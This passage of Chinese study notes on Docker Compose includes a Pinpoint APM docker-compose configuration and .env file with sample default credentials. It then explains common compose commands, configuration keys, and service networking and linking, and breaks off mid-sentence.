unless-stopped networks: - pinpoint volumes: - data-volume:/pinpoint-agent environment: - SPRING_PROFILES=${SPRING_PROFILES} - COLLECTOR_IP=${COLLECTOR_IP} - PROFILER_TRANSPORT_AGENT_COLLECTOR_PORT=${PROFILER_TRANSPORT_AGENT_COLLECTOR_PORT} - PROFILER_TRANSPORT_METADATA_COLLECTOR_PORT=${PROFILER_TRANSPORT_METADATA_COLLECTOR_PORT} - PROFILER_TRANSPORT_STAT_COLLECTOR_PORT=${PROFILER_TRANSPORT_STAT_COLLECTOR_PORT} - PROFILER_TRANSPORT_SPAN_COLLECTOR_PORT=${PROFILER_TRANSPORT_SPAN_COLLECTOR_PORT} - PROFILER_SAMPLING_RATE=${PROFILER_SAMPLING_RATE} - DEBUG_LEVEL=${AGENT_DEBUG_LEVEL} - PROFILER_TRANSPORT_MODULE=${PROFILER_TRANSPORT_MODULE} depends_on: - pinpoint-collector #zookeepers zoo1: image: zookeeper:3.4 restart: always hostname: zoo1 expose: - \"2181\" - \"2888\" - \"3888\" ports: - \"2181\" environment: ZOO_MY_ID: 1 ZOO_SERVERS: server.1=0.0.0.0:2888:3888 server.2=zoo2:2888:3888 server.3=zoo3:2888:3888 networks: - pinpoint zoo2: image: zookeeper:3.4 restart: always hostname: zoo2 expose: - \"2181\" - \"2888\" - \"3888\" ports: - \"2181\" environment: ZOO_MY_ID: 2 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=0.0.0.0:2888:3888 server.3=zoo3:2888:3888 networks: - pinpoint zoo3: image: zookeeper:3.4 restart: always hostname: zoo3 expose: - \"2181\" - \"2888\" - \"3888\" ports: - \"2181\" environment: ZOO_MY_ID: 3 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=zoo2:2888:3888 server.3=0.0.0.0:2888:3888 networks: - pinpoint ##flink jobmanager: build: context: pinpoint-flink dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_FLINK_NAME}-jobmanager\" image: \"pinpointdocker/pinpoint-flink:${PINPOINT_VERSION}\" expose: - \"6123\" ports: - \"${FLINK_WEB_PORT:-8081}:8081\" command: standalone-job -p 1 pinpoint-flink-job.jar -spring.profiles.active release environment: - JOB_MANAGER_RPC_ADDRESS=jobmanager - PINPOINT_ZOOKEEPER_ADDRESS=${PINPOINT_ZOOKEEPER_ADDRESS} networks: - pinpoint depends_on: - zoo1 taskmanager: build: context: pinpoint-flink dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_FLINK_NAME}-taskmanager\" image: \"pinpointdocker/pinpoint-flink:${PINPOINT_VERSION}\" expose: - \"6121\" - \"6122\" - \"19994\" ports: - \"6121:6121\" - \"6122:6122\" - \"19994:19994\" depends_on: - zoo1 - jobmanager command: taskmanager links: - \"jobmanager:jobmanager\" environment: - JOB_MANAGER_RPC_ADDRESS=jobmanager networks: - pinpoint volumes: data-volume: mysql_data: networks: pinpoint: driver: bridge docker-compose\u4f1a\u9ed8\u8ba4\u8bfb\u53d6\u540c\u7ea7\u76ee\u5f55\u7684.env PINPOINT_VERSION=2.3.2 SPRING_PROFILES=release #zookeeper information required PINPOINT_ZOOKEEPER_ADDRESS=zoo1 ### Pinpoint-Hbase PINPOINT_HBASE_NAME=pinpoint-hbase #config for hbase in external docker ### Pinpoint-mysql MYSQL_ROOT_PASSWORD=root123 MYSQL_USER=admin MYSQL_PASSWORD=admin MYSQL_DATABASE=pinpoint ### Pinpoint-Web PINPOINT_WEB_NAME=pinpoint-web SERVER_PORT=8079 WEB_LOGGING_LEVEL_ROOT=INFO CLUSTER_ENABLE=true ADMIN_PASSWORD=admin #analytics CONFIG_SENDUSAGE=true #flink server information required if used BATCH_ENABLE=false BATCH_SERVER_IP=127.0.0.1 BATCH_FLINK_SERVER=pinpoint-flink-jobmanager CONFIG_SHOW_APPLICATIONSTAT=true #mysql information required if used JDBC_DRIVERCLASSNAME=com.mysql.jdbc.Driver JDBC_URL=jdbc:mysql://pinpoint-mysql:3306/pinpoint?characterEncoding=UTF-8 JDBC_USERNAME=admin JDBC_PASSWORD=admin #mail server information required if used ALARM_MAIL_SERVER_URL=smtp.gmail.com ALARM_MAIL_SERVER_PORT=587 ALARM_MAIL_SERVER_USERNAME=username ALARM_MAIL_SERVER_PASSWORD=password ALARM_MAIL_SENDER_ADDRESS=pinpoint_operator@pinpoint.com ALARM_MAIL_TRANSPORT_PROTOCOL=smtp ALARM_MAIL_SMTP_PORT=25 ALARM_MAIL_SMTP_AUTH=false ALARM_MAIL_SMTP_STARTTLS_ENABLE=false ALARM_MAIL_SMTP_STARTTLS_REQUIRED=false ALARM_MAIL_DEBUG=false ### Pinpoint-Collector PINPOINT_COLLECTOR_NAME=pinpoint-collector CLUSTER_ENABLE=true COLLECTOR_LOGGING_LEVEL_ROOT=INFO #grpc COLLECTOR_RECEIVER_GRPC_AGENT_PORT=9991 COLLECTOR_RECEIVER_GRPC_STAT_PORT=9992 COLLECTOR_RECEIVER_GRPC_SPAN_PORT=9993 #thrift COLLECTOR_RECEIVER_BASE_PORT=9994 COLLECTOR_RECEIVER_STAT_UDP_PORT=9995 COLLECTOR_RECEIVER_SPAN_UDP_PORT=9996 FLINK_CLUSTER_ENABLE=true FLINK_CLUSTER_ZOOKEEPER_ADDRESS=zoo1 ### Pinpoint-Agent PINPOINT_AGENT_NAME=pinpoint-agent #network module(GRPC,THRIFT) PROFILER_TRANSPORT_MODULE=GRPC #collector information required COLLECTOR_IP=pinpoint-collector PROFILER_TRANSPORT_AGENT_COLLECTOR_PORT=9991 PROFILER_TRANSPORT_METADATA_COLLECTOR_PORT=9991 PROFILER_TRANSPORT_STAT_COLLECTOR_PORT=9992 PROFILER_TRANSPORT_SPAN_COLLECTOR_PORT=9993 COLLECTOR_TCP_PORT=9994 COLLECTOR_STAT_PORT=9995 COLLECTOR_SPAN_PORT=9996 # Set sampling rate. If you set it to N, 1 out of N transaction will be sampled. PROFILER_SAMPLING_RATE=1 AGENT_ID=app-in-docker APP_NAME=quickapp AGENT_DEBUG_LEVEL=INFO ### Pinpoint-flink PINPOINT_FLINK_NAME=pinpoint-flink FLINK_WEB_PORT=8081 ### Pinpoint-quickstart APP_PORT=8000 \u5de5\u7a0b\u3001\u670d\u52a1\u3001\u5bb9\u5668 Docker Compose \u5c06\u6240\u7ba1\u7406\u7684\u5bb9\u5668\u5206\u4e3a\u4e09\u5c42\uff0c\u5206\u522b\u662f\u5de5\u7a0b\uff08project\uff09\u3001\u670d\u52a1\uff08service\uff09\u3001\u5bb9\u5668\uff08container\uff09 Docker Compose \u8fd0\u884c\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\uff08docker-compose.yml\uff09\u7ec4\u6210\u4e00\u4e2a\u5de5\u7a0b,\u4e00\u4e2a\u5de5\u7a0b\u5305\u542b\u591a\u4e2a\u670d\u52a1\uff0c\u6bcf\u4e2a\u670d\u52a1\u4e2d\u5b9a\u4e49\u4e86\u5bb9\u5668\u8fd0\u884c\u7684\u955c\u50cf\u3001\u53c2\u6570\u3001\u4f9d\u8d56\uff0c\u4e00\u4e2a\u670d\u52a1\u53ef\u5305\u62ec\u591a\u4e2a\u5bb9\u5668\u5b9e\u4f8b Docker Compose \u5e38\u7528\u547d\u4ee4\u4e0e\u914d\u7f6e \u5e38\u89c1\u547d\u4ee4 ps \uff1a\u5217\u51fa\u6240\u6709\u8fd0\u884c\u5bb9\u5668 docker-compose ps logs \uff1a\u67e5\u770b\u670d\u52a1\u65e5\u5fd7\u8f93\u51fa docker-compose logs port \uff1a\u6253\u5370\u7ed1\u5b9a\u7684\u516c\u5171\u7aef\u53e3\uff0c\u4e0b\u9762\u547d\u4ee4\u53ef\u4ee5\u8f93\u51fa eureka \u670d\u52a1 8761 \u7aef\u53e3\u6240\u7ed1\u5b9a\u7684\u516c\u5171\u7aef\u53e3 docker-compose port eureka 8761 build \uff1a\u6784\u5efa\u6216\u8005\u91cd\u65b0\u6784\u5efa\u670d\u52a1 docker-compose build start \uff1a\u542f\u52a8\u6307\u5b9a\u670d\u52a1\u5df2\u5b58\u5728\u7684\u5bb9\u5668 docker-compose start eureka stop \uff1a\u505c\u6b62\u5df2\u8fd0\u884c\u7684\u670d\u52a1\u7684\u5bb9\u5668 docker-compose stop eureka rm \uff1a\u5220\u9664\u6307\u5b9a\u670d\u52a1\u7684\u5bb9\u5668 docker-compose rm eureka up \uff1a\u6784\u5efa\u3001\u542f\u52a8\u5bb9\u5668 docker-compose up kill \uff1a\u901a\u8fc7\u53d1\u9001 SIGKILL \u4fe1\u53f7\u6765\u505c\u6b62\u6307\u5b9a\u670d\u52a1\u7684\u5bb9\u5668 docker-compose kill eureka pull \uff1a\u4e0b\u8f7d\u670d\u52a1\u955c\u50cf scale \uff1a\u8bbe\u7f6e\u6307\u5b9a\u670d\u52a1\u8fd0\u6c14\u5bb9\u5668\u7684\u4e2a\u6570\uff0c\u4ee5 service=num \u5f62\u5f0f\u6307\u5b9a docker-compose scale user=3 movie=3 run \uff1a\u5728\u4e00\u4e2a\u670d\u52a1\u4e0a\u6267\u884c\u4e00\u4e2a\u547d\u4ee4 docker-compose run web bash docker-compose.yml \u5c5e\u6027 version \uff1a\u6307\u5b9a docker-compose.yml \u6587\u4ef6\u7684\u5199\u6cd5\u683c\u5f0f services \uff1a\u591a\u4e2a\u5bb9\u5668\u96c6\u5408 build \uff1a\u914d\u7f6e\u6784\u5efa\u65f6\uff0cCompose \u4f1a\u5229\u7528\u5b83\u81ea\u52a8\u6784\u5efa\u955c\u50cf\uff0c\u8be5\u503c\u53ef\u4ee5\u662f\u4e00\u4e2a\u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7528\u4e8e\u6307\u5b9a Dockerfile \u53c2\u6570 build: ./dir --------------- build: context: ./dir dockerfile: Dockerfile args: buildno: 1 command \uff1a\u8986\u76d6\u5bb9\u5668\u542f\u52a8\u540e\u9ed8\u8ba4\u6267\u884c\u7684\u547d\u4ee4 command: bundle exec thin -p 3000 ---------------------------------- command: [bundle,exec,thin,-p,3000] dns \uff1a\u914d\u7f6e dns \u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u662f\u4e00\u4e2a\u503c\u6216\u5217\u8868 dns: 8.8.8.8 ------------ dns: - 8.8.8.8 - 9.9.9.9 dns_search \uff1a\u914d\u7f6e DNS \u641c\u7d22\u57df\uff0c\u53ef\u4ee5\u662f\u4e00\u4e2a\u503c\u6216\u5217\u8868 dns_search: example.com ------------------------ dns_search: - dc1.example.com - dc2.example.com environment \uff1a\u73af\u5883\u53d8\u91cf\u914d\u7f6e\uff0c\u53ef\u4ee5\u7528\u6570\u7ec4\u6216\u5b57\u5178\u4e24\u79cd\u65b9\u5f0f environment: RACK_ENV: development SHOW: 'ture' ------------------------- environment: - RACK_ENV=development - SHOW=ture env_file \uff1a\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u73af\u5883\u53d8\u91cf\uff0c\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\u6216\u8def\u5f84\u5217\u8868\uff0c\u5176\u4f18\u5148\u7ea7\u4f4e\u4e8e environment \u6307\u5b9a\u7684\u73af\u5883\u53d8\u91cf env_file: .env --------------- env_file: - ./common.env expose \uff1a\u66b4\u9732\u7aef\u53e3\uff0c\u53ea\u5c06\u7aef\u53e3\u66b4\u9732\u7ed9\u8fde\u63a5\u7684\u670d\u52a1\uff0c\u800c\u4e0d\u66b4\u9732\u7ed9\u4e3b\u673a expose: - \"3000\" - \"8000\" image \uff1a\u6307\u5b9a\u670d\u52a1\u6240\u4f7f\u7528\u7684\u955c\u50cf image: java network_mode \uff1a\u8bbe\u7f6e\u7f51\u7edc\u6a21\u5f0f network_mode: \"bridge\" network_mode: \"host\" network_mode: \"none\" network_mode: \"service:[service name]\" network_mode: \"container:[container name/id]\" ports \uff1a\u5bf9\u5916\u66b4\u9732\u7684\u7aef\u53e3\u5b9a\u4e49\uff0c\u548c expose \u5bf9\u5e94 ports: # \u66b4\u9732\u7aef\u53e3\u4fe1\u606f - \"\u5bbf\u4e3b\u673a\u7aef\u53e3:\u5bb9\u5668\u66b4\u9732\u7aef\u53e3\" - \"8763:8763\" - \"8763:8763\" links \uff1a\u5c06\u6307\u5b9a\u5bb9\u5668\u8fde\u63a5\u5230\u5f53\u524d\u8fde\u63a5\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u522b\u540d\uff0c\u907f\u514dip\u65b9\u5f0f\u5bfc\u81f4\u7684\u5bb9\u5668\u91cd\u542f\u52a8\u6001\u6539\u53d8\u7684\u65e0\u6cd5\u8fde\u63a5\u60c5\u51b5 links: # \u6307\u5b9a\u670d\u52a1\u540d\u79f0:\u522b\u540d - docker-compose-eureka-server:compose-eureka volumes \uff1a\u5377\u6302\u8f7d\u8def\u5f84 volumes: - /lib - /var logs \uff1a\u65e5\u5fd7\u8f93\u51fa\u4fe1\u606f --no-color \u5355\u8272\u8f93\u51fa\uff0c\u4e0d\u663e\u793a\u5176\u4ed6\u989c. -f, --follow \u8ddf\u8e2a\u65e5\u5fd7\u8f93\u51fa\uff0c\u5c31\u662f\u53ef\u4ee5\u5b9e\u65f6\u67e5\u770b\u65e5\u5fd7 -t, --timestamps \u663e\u793a\u65f6\u95f4\u6233 --tail \u4ece\u65e5\u5fd7\u7684\u7ed3\u5c3e\u663e\u793a\uff0c--tail=200 Docker Compose \u5176\u5b83 \u66f4\u65b0\u5bb9\u5668 \u5f53\u670d\u52a1\u7684\u914d\u7f6e\u53d1\u751f\u66f4\u6539\u65f6\uff0c\u53ef\u4f7f\u7528 docker-compose up \u547d\u4ee4\u66f4\u65b0\u914d\u7f6e \u6b64\u65f6\uff0cCompose \u4f1a\u5220\u9664\u65e7\u5bb9\u5668\u5e76\u521b\u5efa\u65b0\u5bb9\u5668\uff0c\u65b0\u5bb9\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684 IP \u5730\u5740\u52a0\u5165\u7f51\u7edc\uff0c\u540d\u79f0\u4fdd\u6301\u4e0d\u53d8\uff0c\u4efb\u4f55\u6307\u5411\u65e7\u5bb9\u8d77\u7684\u8fde\u63a5\u90fd\u4f1a\u88ab\u5173\u95ed\uff0c\u91cd\u65b0\u627e\u5230\u65b0\u5bb9\u5668\u5e76\u8fde\u63a5\u4e0a\u53bb links \u670d\u52a1\u4e4b\u95f4\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u540d\u79f0\u76f8\u4e92\u8bbf\u95ee\uff0clinks \u5141\u8bb8\u5b9a\u4e49\u4e00\u4e2a\u522b\u540d\uff0c\u4ece\u800c\u4f7f\u7528\u8be5\u522b\u540d\u8bbf\u95ee\u5176\u5b83\u670d\u52a1 version: '2' services: web: build: . links: - \"db:database\" db: image: postgres \u8fd9\u6837 Web \u670d\u52a1\u5c31\u53ef\u4ee5\u4f7f\u7528 db \u6216 database \u4f5c\u4e3a hostname \u8bbf\u95ee db \u670d\u52a1\u4e86 restart \u91cd\u542f\u7b56\u7565 always \u2013 \u4e0d\u7ba1\u9000\u51fa\u72b6\u6001\u7801\u662f\u4ec0\u4e48\u59cb\u7ec8\u91cd\u542f\u5bb9\u5668\u3002\u5f53\u6307\u5b9aalways\u65f6\uff0cdocker daemon\u5c06\u65e0\u9650\u6b21\u6570\u5730\u91cd\u542f\u5bb9\u5668\u3002\u5bb9\u5668\u4e5f\u4f1a\u5728daemon\u542f\u52a8\u65f6\u5c1d\u8bd5\u91cd\u542f\uff0c\u4e0d\u7ba1\u5bb9\u5668\u5f53\u65f6\u7684\u72b6\u6001\u5982\u4f55\u3002 no \u2013 \u5bb9\u5668\u9000\u51fa\u65f6\u4e0d\u8981\u81ea\u52a8\u91cd\u542f\u3002\u8fd9\u4e2a\u662f\u9ed8\u8ba4\u503c\u3002 on-failure[:max-retries] \u2013 \u53ea\u5728\u5bb9\u5668\u4ee5\u975e0\u72b6\u6001\u7801\u9000\u51fa\u65f6\u91cd\u542f\u3002\u53ef\u9009\u7684\uff0c\u53ef\u4ee5\u9000\u51fadocker daemon\u5c1d\u8bd5\u91cd\u542f\u5bb9\u5668\u7684\u6b21\u6570\u3002 unless-stopped - \u4e0d\u7ba1\u9000\u51fa\u72b6\u6001\u7801\u662f\u4ec0\u4e48\u59cb\u7ec8\u91cd\u542f\u5bb9\u5668\uff0c\u4e0d\u8fc7\u5f53daemon\u542f\u52a8\u65f6\uff0c\u5982\u679c\u5bb9\u5668\u4e4b\u524d\u5df2\u7ecf\u4e3a\u505c\u6b62\u72b6\u6001\uff0c\u4e0d\u8981\u5c1d\u8bd5\u542f\u52a8\u5b83\u3002 depends_on \u5728\u4f7f\u7528 Compose \u65f6\uff0c\u6700\u5927\u7684\u597d\u5904\u5c31\u662f\u5c11\u6253\u542f\u52a8\u547d\u4ee4\uff0c\u4f46\u662f\u4e00\u822c\u9879\u76ee\u5bb9\u5668\u542f\u52a8\u7684\u987a\u5e8f\u662f\u6709\u8981\u6c42\u7684\uff0c\u5982\u679c\u76f4\u63a5\u4ece\u4e0a\u5230\u4e0b\u542f\u52a8\u5bb9\u5668\uff0c\u5fc5\u7136\u4f1a\u56e0\u4e3a\u5bb9\u5668\u4f9d\u8d56\u95ee\u9898\u800c\u542f\u52a8\u5931\u8d25\u3002 \u4f8b\u5982\u5728\u6ca1\u542f\u52a8\u6570\u636e\u5e93\u5bb9\u5668\u7684\u65f6\u5019\u542f\u52a8\u4e86\u5e94\u7528\u5bb9\u5668\uff0c\u8fd9\u65f6\u5019\u5e94\u7528\u5bb9\u5668\u4f1a\u56e0\u4e3a\u627e\u4e0d\u5230\u6570\u636e\u5e93\u800c\u9000\u51fa\uff0c\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u6211\u4eec\u9700\u8981\u52a0\u5165\u4e00\u4e2a\u6807\u7b7e\uff0c\u5c31\u662f depends_on\uff0c\u8fd9\u4e2a\u6807\u7b7e\u89e3\u51b3\u4e86\u5bb9\u5668\u7684\u4f9d\u8d56\u3001\u542f\u52a8\u5148\u540e\u7684\u95ee\u9898\u3002 \u4f8b\u5982\u4e0b\u9762\u5bb9\u5668\u4f1a\u5148\u542f\u52a8 redis \u548c db \u4e24\u4e2a\u670d\u52a1\uff0c\u6700\u540e\u624d\u542f\u52a8 web \u670d\u52a1\uff1a version: '2' services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres \u6ce8\u610f\u7684\u662f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 docker-compose up web \u8fd9\u6837\u7684\u65b9\u5f0f\u542f\u52a8 web \u670d\u52a1\u65f6\uff0c\u4e5f\u4f1a\u542f\u52a8 redis \u548c db \u4e24\u4e2a\u670d\u52a1\uff0c\u56e0\u4e3a\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u4f9d\u8d56\u5173\u7cfb\u3002 https://juejin.cn/post/6844903976534540296 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cCompose\u4f1a\u4e3a\u6211\u4eec\u7684\u5e94\u7528\u521b\u5efa\u4e00\u4e2a\u7f51\u7edc\uff0c\u670d\u52a1\u7684\u6bcf\u4e2a\u5bb9\u5668\u90fd\u4f1a\u52a0\u5165\u8be5\u7f51\u7edc\u4e2d\u3002\u8fd9\u6837\uff0c\u5bb9\u5668\u5c31\u53ef\u88ab\u8be5\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u5bb9\u5668\u8bbf\u95ee\uff0c\u4e0d\u4ec5\u5982\u6b64\uff0c\u8be5\u5bb9\u5668\u8fd8\u80fd\u4ee5\u670d\u52a1\u540d\u79f0\u4f5c\u4e3ahostname\u88ab\u5176\u4ed6\u5bb9\u5668\u8bbf\u95ee\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u7f51\u7edc\u540d\u79f0\u57fa\u4e8eCompose\u7684\u5de5\u7a0b\u540d\u79f0\uff0c\u800c\u9879\u76ee\u540d\u79f0\u57fa\u4e8edocker-compose.yml\u6240\u5728\u76ee\u5f55\u7684\u540d\u79f0\u3002\u5982\u9700\u4fee\u6539\u5de5\u7a0b\u540d\u79f0\uff0c\u53ef\u4f7f\u7528--project-name\u6807\u8bc6\u6216COMPOSE_PORJECT_NAME\u73af\u5883\u53d8\u91cf\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5728\u540d\u4e3amyapp\u7684\u76ee\u5f55\u4e2d\uff0c\u5e76\u4e14docker-compose.yml\u5982\u4e0b\u6240\u793a\uff1a version: '2' services: web: build: . ports: - \"8000:8000\" db: image: postgres \u590d\u5236\u4ee3\u7801 \u5f53\u6211\u4eec\u8fd0\u884cdocker-compose up\u65f6\uff0c\u5c06\u4f1a\u6267\u884c\u4ee5\u4e0b\u51e0\u6b65\uff1a \u521b\u5efa\u4e00\u4e2a\u540d\u4e3amyapp_default\u7684\u7f51\u7edc\uff1b \u4f7f\u7528web\u670d\u52a1\u7684\u914d\u7f6e\u521b\u5efa\u5bb9\u5668\uff0c\u5b83\u4ee5\u201cweb\u201d\u8fd9\u4e2a\u540d\u79f0\u52a0\u5165\u7f51\u7edcmyapp_default\uff1b \u4f7f\u7528db\u670d\u52a1\u7684\u914d\u7f6e\u521b\u5efa\u5bb9\u5668\uff0c\u5b83\u4ee5\u201cdb\u201d\u8fd9\u4e2a\u540d\u79f0\u52a0\u5165\u7f51\u7edcmyapp_default\u3002 \u5bb9\u5668\u95f4\u53ef\u4f7f\u7528\u670d\u52a1\u540d\u79f0\uff08web\u6216db\uff09\u4f5c\u4e3ahostname\u76f8\u4e92\u8bbf\u95ee\u3002\u4f8b\u5982\uff0cweb\u8fd9\u4e2a\u670d\u52a1\u53ef\u4f7f\u7528 postgres://db:5432 \u8bbf\u95eedb\u5bb9\u5668\u3002 \u66f4\u65b0\u5bb9\u5668 \u5f53\u670d\u52a1\u7684\u914d\u7f6e\u53d1\u751f\u66f4\u6539\u65f6\uff0c\u53ef\u4f7f\u7528docker-compose up\u547d\u4ee4\u66f4\u65b0\u914d\u7f6e\u3002 \u6b64\u65f6\uff0cCompose\u4f1a\u5220\u9664\u65e7\u5bb9\u5668\u5e76\u521b\u5efa\u65b0\u5bb9\u5668\u3002\u65b0\u5bb9\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684IP\u5730\u5740\u52a0\u5165\u7f51\u7edc\uff0c\u540d\u79f0\u4fdd\u6301\u4e0d\u53d8\u3002\u4efb\u4f55\u6307\u5411\u65e7\u5bb9\u5668\u7684\u8fde\u63a5\u90fd\u4f1a\u88ab\u5173\u95ed\uff0c\u5bb9\u5668\u4f1a\u91cd\u65b0\u627e\u5230\u65b0\u5bb9\u5668\u5e76\u8fde\u63a5\u4e0a\u53bb\u3002 links \u524d\u6587\u8bb2\u8fc7\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u670d\u52a1\u4e4b\u95f4\u53ef\u4f7f\u7528\u670d\u52a1\u540d\u79f0\u76f8\u4e92\u8bbf\u95ee\u3002links\u5141\u8bb8\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u522b\u540d\uff0c\u4ece\u800c\u4f7f\u7528\u8be5\u522b\u540d\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1a version: '2' services: web: build: . links: - \"db:database\" db: image: postgres \u590d\u5236\u4ee3\u7801 \u8fd9\u6837web\u670d\u52a1\u5c31\u53ef\u4f7f\u7528db\u6216database\u4f5c\u4e3ahostname\u8bbf\u95eedb\u670d\u52a1\u4e86\u3002 \u6307\u5b9a\u81ea\u5b9a\u4e49\u7f51\u7edc \u4e00\u4e9b\u573a\u666f\u4e0b\uff0c\u9ed8\u8ba4\u7684\u7f51\u7edc\u914d\u7f6e\u6ee1\u8db3\u4e0d\u4e86\u6211\u4eec\u7684\u9700\u6c42\uff0c\u6b64\u65f6\u6211\u4eec\u53ef\u4f7f\u7528networks\u547d\u4ee4\u81ea\u5b9a\u4e49\u7f51\u7edc\u3002networks\u547d\u4ee4\u5141\u8bb8\u6211\u4eec\u521b\u5efa\u66f4\u52a0\u590d\u6742\u7684\u7f51\u7edc\u62d3\u6251\u5e76\u6307\u5b9a\u81ea\u5b9a\u4e49\u7f51\u7edc\u9a71\u52a8\u548c\u9009\u9879\u3002\u4e0d\u4ec5\u5982\u6b64\uff0c\u6211\u4eec\u8fd8\u53ef\u4f7f\u7528networks\u5c06\u670d\u52a1\u8fde\u63a5\u5230\u4e0d\u662f\u7531Compose\u7ba1\u7406\u7684\u3001\u5916\u90e8\u521b\u5efa\u7684\u7f51\u7edc\u3002 \u5982\u4e0b\uff0c\u6211\u4eec\u5728\u5176\u4e2d\u5b9a\u4e49\u4e86\u4e24\u4e2a\u81ea\u5b9a\u4e49\u7f51\u7edc\u3002 version: '2' services: proxy: build: ./proxy networks: - front app: build: ./app networks: - front - back db: image: postgres networks: - back networks: front: # Use a custom driver driver: custom-driver-1 back: # Use a custom driver which takes special options driver: custom-driver-2 driver_opts: foo: \"1\" bar: \"2\" \u590d\u5236\u4ee3\u7801 \u5176\u4e2d\uff0cproxy\u670d\u52a1\u4e0edb\u670d\u52a1\u9694\u79bb\uff0c\u4e24\u8005\u5206\u522b\u4f7f\u7528\u81ea\u5df1\u7684\u7f51\u7edc\uff1bapp\u670d\u52a1\u53ef\u4e0e\u4e24\u8005\u901a\u4fe1\u3002 \u7531\u672c\u4f8b\u4e0d\u96be\u53d1\u73b0\uff0c\u4f7f\u7528networks\u547d\u4ee4\uff0c\u5373\u53ef\u65b9\u4fbf\u5b9e\u73b0\u670d\u52a1\u95f4\u7684\u7f51\u7edc\u9694\u79bb\u4e0e\u8fde\u63a5\u3002 \u914d\u7f6e\u9ed8\u8ba4\u7f51\u7edc \u9664\u81ea\u5b9a\u4e49\u7f51\u7edc\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4e3a\u9ed8\u8ba4\u7f51\u7edc\u81ea\u5b9a\u4e49\u914d\u7f6e\u3002 version: '2' services: web: build: . ports: - \"8000:8000\" db: image: postgres networks: default: # Use a custom driver driver: custom-driver-1 \u590d\u5236\u4ee3\u7801 \u8fd9\u6837\uff0c\u5c31\u53ef\u4e3a\u8be5\u5e94\u7528\u6307\u5b9a\u81ea\u5b9a\u4e49\u7684\u7f51\u7edc\u9a71\u52a8\u3002 \u4f7f\u7528\u5df2\u5b58\u5728\u7684\u7f51\u7edc \u4e00\u4e9b\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u5e76\u4e0d\u9700\u8981\u521b\u5efa\u65b0\u7684\u7f51\u7edc\uff0c\u800c\u53ea\u9700\u52a0\u5165\u5df2\u5b58\u5728\u7684\u7f51\u7edc\uff0c\u6b64\u65f6\u53ef\u4f7f\u7528external\u9009\u9879\u3002\u793a\u4f8b\uff1a networks: default: external: name: my-pre-existing-network\u590d\u5236\u4ee3\u7801 Docker Compose \u94fe\u63a5\u5916\u90e8\u5bb9\u5668\u7684\u51e0\u79cd\u65b9\u5f0f \u5728Docker\u4e2d\uff0c\u5bb9\u5668\u4e4b\u95f4\u7684\u94fe\u63a5\u662f\u4e00\u79cd\u5f88\u5e38\u89c1\u7684\u64cd\u4f5c\uff1a\u5b83\u63d0\u4f9b\u4e86\u8bbf\u95ee\u5176\u4e2d\u7684\u67d0\u4e2a\u5bb9\u5668\u7684\u7f51\u7edc\u670d\u52a1\u800c\u4e0d\u9700\u8981\u5c06\u6240\u9700\u7684\u7aef\u53e3\u66b4\u9732\u7ed9Docker Host\u4e3b\u673a\u7684\u529f\u80fd\u3002Docker Compose\u4e2d\u5bf9\u8be5\u7279\u6027\u7684\u652f\u6301\u540c\u6837\u662f\u5f88\u65b9\u4fbf\u7684\u3002\u7136\u800c\uff0c\u5982\u679c\u9700\u8981\u94fe\u63a5\u7684\u5bb9\u5668\u6ca1\u6709\u5b9a\u4e49\u5728\u540c\u4e00\u4e2a docker-compose.yml \u4e2d\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u7a0d\u5fae\u9ebb\u70e6\u590d\u6742\u4e86\u70b9\u3002 \u5728\u4e0d\u4f7f\u7528Docker Compose\u7684\u65f6\u5019\uff0c\u5c06\u4e24\u4e2a\u5bb9\u5668\u94fe\u63a5\u8d77\u6765\u4f7f\u7528 \u2014link \u53c2\u6570\uff0c\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u7b80\u5355\uff0c\u4ee5 nginx \u955c\u50cf\u4e3a\u4f8b\u5b50\uff1a docker run --rm --name test1 -d nginx #\u5f00\u542f\u4e00\u4e2a\u5b9e\u4f8btest1 docker run --rm --name test2 --link test1 -d nginx #\u5f00\u542f\u4e00\u4e2a\u5b9e\u4f8btest2\u5e76\u4e0etest1\u5efa\u7acb\u94fe\u63a5 \u590d\u5236\u4ee3\u7801 \u8fd9\u6837\uff0c test2 \u4e0e test1 \u4fbf\u5efa\u7acb\u4e86\u94fe\u63a5\uff0c\u5c31\u53ef\u4ee5\u5728 test2 \u4e2d\u4f7f\u7528\u8bbf\u95ee test1 \u4e2d\u7684\u670d\u52a1\u4e86\u3002 \u5982\u679c\u4f7f\u7528Docker 